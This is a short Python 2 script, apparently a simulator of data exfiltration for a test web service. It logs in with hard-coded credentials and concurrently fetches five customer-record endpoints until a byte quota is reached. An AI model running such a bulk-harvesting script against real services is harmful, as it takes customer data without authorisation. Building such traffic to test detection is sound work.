import time
import base64
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession
'''

'''
# amt is the amt to exfiltrate within one 5 sec period.
def exfiltrate_data():
    cur_time = time.time()
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=20))
    base64string = base64.encodestring('%s:%s' % ('user', 'password')).replace('\n', '')
    login = requests.get(addr + "/login", headers={"Authorization":"Basic %s" % base64string})
    print login.text, len(login.content)
    amt_exfil = 0
    while amt_exfil < int(amt):
        exfil_data_fut = session.get(addr + "/customers/azc", cookies=login.cookies)
        exfil_data_fut_1 = session.get(addr + "/customers/frc", cookies=login.cookies)
        exfil_data_fut_2 = session.get(addr + "/customers/vpp", cookies=login.cookies)
        exfil_data_fut_3 = session.get(addr + "/customers/add", cookies=login.cookies)
        exfil_data_fut_4 = session.get(addr + "/customers/rep", cookies=login.cookies)
        exfil_data = exfil_data_fut.result()
        exfil_data_1 = exfil_data_fut_1.result()
        exfil_data_2 = exfil_data_fut_2.result()
        exfil_data_3 = exfil_data_fut_3.result()
        exfil_data_4 = exfil_data_fut_4.result()
        print exfil_data.text
        amt_exfil = amt_exfil + len(exfil_data.content) + len(exfil_data_1.content) + len(exfil_data_2.content)
        amt_exfil = amt_exfil + len(exfil_data_3.content) + len(exfil_data_4.content)
        print len(exfil_data.content), amt_exfil
    #exfil_data_fut = session.get(addr + "/customers/azc", cookies=login.cookies)
    #exfil_data = exfil_data_fut.result()
    #print len(exfil_data.content)
    print "that took: ", time.time() - cur_time, " seconds" 

if __name__=="__main__":
    if len(sys.argv) < 2:
        print "triggered"
    amt= sys.argv[1]
    addr= sys.argv[2]
    exfiltrate_data()
